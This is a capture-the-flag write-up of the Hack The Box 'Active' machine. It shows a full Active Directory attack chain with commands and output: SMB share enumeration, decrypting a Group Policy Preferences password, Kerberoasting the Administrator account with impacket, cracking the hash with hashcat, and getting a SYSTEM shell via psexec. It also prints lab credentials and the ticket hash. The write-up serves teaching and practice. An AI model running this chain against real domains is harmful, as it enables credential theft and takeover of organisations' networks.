# Hackthebox Active

Before we start I always reset the box, it is often that services have crashed or behaves in unintended ways after others have exploited them. And I do not want any spoilers that may have been left by others on the box.

### Attack Summary

1. Enumerate shares
2. GPP-Password
3. Kerberoast


## Recon

### Service Discovey

First, as always. we perform our initial enumeration of the box using Nmap.

```
# Nmap 7.70 scan initiated Wed Dec 12 18:15:41 2018 as: nmap -v -sV -p- -T4 -oA active_full_tcp 10.10.10.100
Nmap scan report for 10.10.10.100
Host is up (0.079s latency).
Not shown: 65512 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2018-12-12 17:16:42Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msdfsr?
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  unknown
49169/tcp open  unknown
49170/tcp open  unknown
49180/tcp open  unknown
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

As we can see there are a lot of open ports on this box. Services like DNS, Kerberos, LDAP etc tells us that this may actually be a Domain Controller. The name Active also suggests that it may have something to do with Active Directory.

It is hard to know where to start when there are a lot of services like this.


On Domain Controllers however, there should be a couple of default shares available. Let's check if we have access to any shares on the system, using the tool smbmap.

```
root@kali:~/htb# smbmap -H 10.10.10.100
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.100...
[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  NO ACCESS
        C$                                                      NO ACCESS
        IPC$                                                    NO ACCESS
        NETLOGON                                                NO ACCESS
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS
        Users                                                   NO ACCESS
```

Seems like we can access one share called "Replication".
If we add the -R flag to smbmap, the script will list contents of shares that we have permissions to list. 

```
root@kali:~/htb# smbmap -H 10.10.10.100 -R                       
[+] Finding open SMB ports....                                    
[+] User SMB session establishd on 10.10.10.100...                       
[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  NO ACCESS 
        C$                                                      NO ACCESS                                                                                                                           
        IPC$                                                    NO ACCESS
        NETLOGON                                                NO ACCESS
        Replication                                             READ ONLY
        .\                                                                                                                                                                                          
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    active.htb 
        .\\active.htb\                                                   
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    DfsrPrivate
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    Policies
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    scripts
        .\\active.htb\DfsrPrivate\
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    ConflictAndDeleted
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    Deleted
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    Installing
        .\\active.htb\Policies\
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    {31B2F340-016D-11D2-945F-00C04FB984F9}
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    {6AC1786C-016F-11D2-945F-00C04fB984F9}
        .\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    ..
        -r--r--r--               23 Sat Jul 21 12:38:11 2018    GPT.INI
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    Group Policy
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    MACHINE
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    USER
        .\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    ..
        -r--r--r--              119 Sat Jul 21 12:38:11 2018    GPE.INI
        .\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    Microsoft
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    Preferences
        -r--r--r--             2788 Sat Jul 21 12:38:11 2018    Registry.pol
        .\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    Windows NT
        .\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    SecEdit
        .\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    ..
        -r--r--r--             1098 Sat Jul 21 12:38:11 2018    GptTmpl.inf
        .\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    Groups
        .\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    ..
        -r--r--r--              533 Sat Jul 21 12:38:11 2018    Groups.xml
        .\\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    ..
        -r--r--r--               22 Sat Jul 21 12:38:11 2018    GPT.INI
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    MACHINE
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    USER
        .\\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    Microsoft
        .\\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    Windows NT
        .\\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    SecEdit
        .\\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 12:37:44 2018    ..
        -r--r--r--             3722 Sat Jul 21 12:38:11 2018    GptTmpl.inf
        SYSVOL                                                  NO ACCESS
        Users                                                   NO ACCESS

```


## Initial Compromise

### Group Policy Preferences

If you've done pentesting in Windows domains before you probably have heard about GPP passwords and SYSVOL shares.

Here is a great resource for more information: https://adsecurity.org/?p=2288.

On the accessible share we see a file called "Groups.xml" in the \MACHINE\Preferences\ folder, now there should be a clock ringing that it could contain some juicy information, regarding to what we just learned about GPP passwords. Let's grab that file.

We can connect using smbclient and anonymous login.

```
root@kali:~/htb# smbclient //10.10.10.100/Replication
Enter WORKGROUP\root's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> 
```

Once we downloaded the file with a simple "get" command in smbclient, we see a cpassword string. 

```
root@kali:~/htb/active# cat Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

There is a tool in Kali called gpp-decrypt that we can use to decrypt the password.

```
root@kali:~/htb/active# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

GPPstillStandingStrong2k18
```

Now that we have some valid credentials to an account called active.htb\SVC_TGS, and we may have some additional access to shares using these creds. Let's run smbmap again with our credentials.


```
root@kali:~/htb/active# smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100 -d active.htb
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.100...
[+] IP: 10.10.10.100:445        Name: 10.10.10.100                                      
        Disk                                                    Permissions
        ----                                                    -----------
        ADMIN$                                                  NO ACCESS
        C$                                                      NO ACCESS
        IPC$                                                    NO ACCESS
        NETLOGON                                                READ ONLY
        Replication                                             READ ONLY
        SYSVOL                                                  READ ONLY
        Users                                                   READ ONLY
```

This gives us access to the Users directory among others

```
root@kali:~/htb/active# smbclient -U SVC_TGS //10.10.10.100/Users
Enter WORKGROUP\SVC_TGS's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sat Jul 21 16:39:20 2018
  ..                                 DR        0  Sat Jul 21 16:39:20 2018
  Administrator                       D        0  Mon Jul 16 12:14:21 2018
  All Users                         DHS        0  Tue Jul 14 07:06:44 2009
  Default                           DHR        0  Tue Jul 14 08:38:21 2009
  Default User                      DHS        0  Tue Jul 14 07:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 06:57:55 2009
  Public                             DR        0  Tue Jul 14 06:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 17:16:32 2018

                10459647 blocks of size 4096. 4947348 blocks available
smb: \> 
```

## Pivilege Escalation

### Kerberoasting

The account we compromised is called "SVC_TGS", so we can assume that it is a service account. TGS is also probably referring to the Kerberos "Ticket Granting System". So I was thinking that the privesc could have something to do with Kerberos. 

Let's check which users we have in the Active Directory.

```
root@kali:~/htb/active# /usr/share/doc/python-impacket/examples/GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100 
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

Password:
[*] Querying 10.10.10.100 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-18 21:06:40  2018-07-30 19:17:40 
Guest                                                 <never>              <never>             
krbtgt                                                2018-07-18 20:50:36  <never>             
SVC_TGS                                               2018-07-18 22:14:38  2018-07-21 16:01:30 
```
Ok so we have our compromised account, krbtgt and Administrator. 

Kerberoasting is a very interesting attack against Kerberos and works by capturing an TGS request from the Domain Controller containing the target users krb5tgs hash. This hash is based upon the users plain text password. 

Here are some great resources for more information about Kerberoasting:

- https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/
- https://adsecurity.org/?p=2293 

So first we need to get the service principal name (SPN) of the target user. This can be done in many ways. I use a tool by impacket called GetUserSPNs which will print all the information we need.

```
root@kali:~/htb/active# /usr/share/doc/python-impacket/examples/GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100 -request
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon           
--------------------  -------------  --------------------------------------------------------  -------------------  -------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40  2018-07-30 19:17:40 



$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$5e56c7b5d2ca48c80e2927d52b631d61$a60e0d66b3751033133b2abd2c119cbe340f90505ab9296590dcdad8426e508a0fbb0b1cf7e506aaf7e2c999cb33be8a129624272ce206688e8c9efb9feb8bb276dcf2296f3002c33662e9b0fa6653e8490614507d836b612a9cb8ed471e935d7602d6d72cfd0e56851b566671cc3b6e6c82fc94f6dcf99c526598226d8496846a1ece5b7832fbaf56a18902a36e8aa4275db6f93331397e140c0668d7890bee6b3e0ab48da57caa641931e9abf9c7959d5a6af8a96ece4cf4f27f4dc6120eadcf1f6c2f78ed1bcfb9ad5f6145c9528ea5149e2b3e1ad7dfe500c913317d06fe38e53ae076ae9421e8d506bd7fd43316988d420a7f28bac132505a3c0df94e2b7e7af6adb8049402889d8eb48dce0a2129f285b9b314a3958eed92a01442c36dda14ffac45fa9ad39f2e39f569764a156ab836b25a707b6da27323e01f23817760e04ef5c57122e7308a82c42ef287a6c6b9f2119962d4dd2ab5db2f64405a278c2eb0974ba2daf3dcb6e3bbd60dd6df3a7ce1cc8289bead4003515de6735a2f1625188412484d58533ecc37ff90f254d73b9aca02fd88b6c57b82fd4c1cc4586b150ded2406ef524a8dd34c9d0a39f6854b220570d69bc8c351db8aa0120233e6c2f0e2f5a1913257baf86ffa300fa5439ca0396611ec989d8c3d5b1ba905031b57357eab884a7802fcad828ea4d8be1f4de69e4abbf4ba2a7cf8d389a96a3142114b652b0da597c71cc3ff62e649252a34903ef9cec906f9e5ce79c2b4b789d8f185a3f4da552cf5ab28cf1e6dfd849e6217aa396c85af4775e550ea160ef0f1dcac5e4d8e85e263e83cf55054181f9a15cea23302a82ca45f3415bfc282eae1615335c6e986768567ab13dfde6fdcf630620c663b04c1e2e44d2bd8383e636fd7b7b621b35b2b3246cf78bf60bdabac4a2d457f4745bcdc1444e5c594edd94272a79da5113e405211eb1f6b55757ea88a0da41410da58d8722d3141e18e82820ccd58f0016e3ed363667e7fb69da1fa670c4b34ca23d3656bd41d5c5071f8e54d38ec873fef0864743393b06a9ad5468d2d24069a038ca44c7a4360d1d96a6de30d30650af0e817f4e46d77d7fac1baaba4a9d69d313f02fb13c4e5eace5d3efb7ec4874acd95c56a96fbae84b2f6b71f6a4e86b2f701607c9e3e8ce15dbfa7c4cdfaada3aaedb638baa9b748cdca2924952355d2125587605102de73e06b4f2b905f5259f160c678ad36c04dfc3d6050d908ad27b880942e
```

Then we need to crack this hash offline. I mostly use hashcat when cracking things, below is the output of running it against the captured hash.

```
root@kali:~/htb/active# hashcat -m 13100 kerberos_hash.txt /usr/share/wordlists/rockyou.txt --force --potfile-disable
hashcat (v5.0.0) starting...         
                                             

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Type........: Kerberos 5 TGS-REP etype 23
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~4...80942e
Time.Started.....: Fri Dec 21 12:16:02 2018 (6 secs)
Time.Estimated...: Fri Dec 21 12:16:43 2018 (35 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   342.5 kH/s (8.21ms) @ Accel:32 Loops:1 Thr:64 Vec:8
Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts
Progress.........: 2220032/14344385 (15.48%)
Rejected.........: 0/2220032 (0.00%)
Restore.Point....: 2220032/14344385 (15.48%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 695526 -> 63412123

$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$5e56c7b5d2ca48c80e2927d52b631d61$a60e0d66b3751033133b2abd2c119cbe340f90505ab9296590dcdad8426e508a0fbb0b1cf7e506aaf7e2c999cb33be8a129624272ce206688e8c9efb9feb8bb276dcf2296f3002c33662e9b0fa6653e8490614507d836b612a9cb8ed471e935d7602d6d72cfd0e56851b566671cc3b6e6c82fc94f6dcf99c526598226d8496846a1ece5b7832fbaf56a18902a36e8aa4275db6f93331397e140c0668d7890bee6b3e0ab48da57caa641931e9abf9c7959d5a6af8a96ece4cf4f27f4dc6120eadcf1f6c2f78ed1bcfb9ad5f6145c9528ea5149e2b3e1ad7dfe500c913317d06fe38e53ae076ae9421e8d506bd7fd43316988d420a7f28bac132505a3c0df94e2b7e7af6adb8049402889d8eb48dce0a2129f285b9b314a3958eed92a01442c36dda14ffac45fa9ad39f2e39f569764a156ab836b25a707b6da27323e01f23817760e04ef5c57122e7308a82c42ef287a6c6b9f2119962d4dd2ab5db2f64405a278c2eb0974ba2daf3dcb6e3bbd60dd6df3a7ce1cc8289bead4003515de6735a2f1625188412484d58533ecc37ff90f254d73b9aca02fd88b6c57b82fd4c1cc4586b150ded2406ef524a8dd34c9d0a39f6854b220570d69bc8c351db8aa0120233e6c2f0e2f5a1913257baf86ffa300fa5439ca0396611ec989d8c3d5b1ba905031b57357eab884a7802fcad828ea4d8be1f4de69e4abbf4ba2a7cf8d389a96a3142114b652b0da597c71cc3ff62e649252a34903ef9cec906f9e5ce79c2b4b789d8f185a3f4da552cf5ab28cf1e6dfd849e6217aa396c85af4775e550ea160ef0f1dcac5e4d8e85e263e83cf55054181f9a15cea23302a82ca45f3415bfc282eae1615335c6e986768567ab13dfde6fdcf630620c663b04c1e2e44d2bd8383e636fd7b7b621b35b2b3246cf78bf60bdabac4a2d457f4745bcdc1444e5c594edd94272a79da5113e405211eb1f6b55757ea88a0da41410da58d8722d3141e18e82820ccd58f0016e3ed363667e7fb69da1fa670c4b34ca23d3656bd41d5c5071f8e54d38ec873fef0864743393b06a9ad5468d2d24069a038ca44c7a4360d1d96a6de30d30650af0e817f4e46d77d7fac1baaba4a9d69d313f02fb13c4e5eace5d3efb7ec4874acd95c56a96fbae84b2f6b71f6a4e86b2f701607c9e3e8ce15dbfa7c4cdfaada3aaedb638baa9b748cdca2924952355d2125587605102de73e06b4f2b905f5259f160c678ad36c04dfc3d6050d908ad27b880942e:Ticketmaster1968
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 TGS-REP etype 23
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~4...80942e
Time.Started.....: Fri Dec 21 12:16:02 2018 (30 secs)
Time.Estimated...: Fri Dec 21 12:16:32 2018 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   346.6 kH/s (7.71ms) @ Accel:32 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 10539008/14344385 (73.47%)
Rejected.........: 0/10539008 (0.00%)
Restore.Point....: 10534912/14344385 (73.44%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Tioncurtis23 -> Thelittlemermaid

Started: Fri Dec 21 12:15:51 2018
Stopped: Fri Dec 21 12:16:33 2018
```

So the password for the administrator account is "Ticketmaster1968" without the quotes.

We could now use psexec with the credentials to gain an administrative shell:

```
root@kali:~/htb/active# /usr/share/doc/python-impacket/examples/psexec.py active.htb/Administrator@10.10.10.100                                                                                     
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

Password:
[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file gzSfYqZY.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service kHLD on 10.10.10.100.....
[*] Starting service kHLD.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```
